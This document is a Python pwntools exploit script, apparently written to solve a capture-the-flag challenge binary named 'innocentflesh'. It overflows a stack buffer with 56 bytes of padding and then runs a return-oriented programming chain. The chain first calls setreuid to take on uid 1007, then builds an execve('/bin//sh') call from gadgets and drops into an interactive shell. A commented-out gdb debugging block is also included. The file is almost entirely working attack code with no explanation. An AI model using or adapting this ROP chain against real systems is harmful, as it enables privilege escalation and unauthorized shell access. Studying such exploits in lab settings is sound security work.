from pwn import *
from struct import pack

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

io = process('./innocentflesh')


p = b'\x90' * 56

p1 = b''
p1 += p64(0x00000000004005af) # pop rax; ret;
p1 += p64(0x71)
p1 += p64(0x0000000000410093) # pop rsi; ret;
p1 += p64(1007) # data for rsi
p1 += p64(0x00000000004006a6) # pop rdi; ret;
p1 += p64(1007) # data for rdi
p1 += p64(0x0000000000474e15) # syscall; ret;

p2 = b''
p2 += pack('<Q', 0x0000000000410093) # pop rsi ; ret
p2 += pack('<Q', 0x00000000006b90e0) # @ .data
p2 += pack('<Q', 0x00000000004005af) # pop rax ; ret
p2 += b'/bin//sh'
p2 += pack('<Q', 0x000000000047f541) # mov qword ptr [rsi], rax ; ret
p2 += pack('<Q', 0x0000000000410093) # pop rsi ; ret
p2 += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p2 += pack('<Q', 0x00000000004441d0) # xor rax, rax ; ret
p2 += pack('<Q', 0x000000000047f541) # mov qword ptr [rsi], rax ; ret
p2 += pack('<Q', 0x00000000004006a6) # pop rdi ; ret
p2 += pack('<Q', 0x00000000006b90e0) # @ .data
p2 += pack('<Q', 0x0000000000410093) # pop rsi ; ret
p2 += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p2 += pack('<Q', 0x0000000000448e95) # pop rdx ; ret
p2 += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p2 += pack('<Q', 0x00000000004441d0) # xor rax, rax ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x0000000000474870) # add rax, 1 ; ret
p2 += pack('<Q', 0x000000000040124c) # syscall
'''
context.terminal = ['tmux', 'splitw', '-h']

io = gdb.debug("./innocentflesh", gdbscript=
        
        source /usr/local/share/gef/gef.py
        break *get_name+51
        continue
        )
'''
io.sendline(p+p1+p2)
io.interactive()

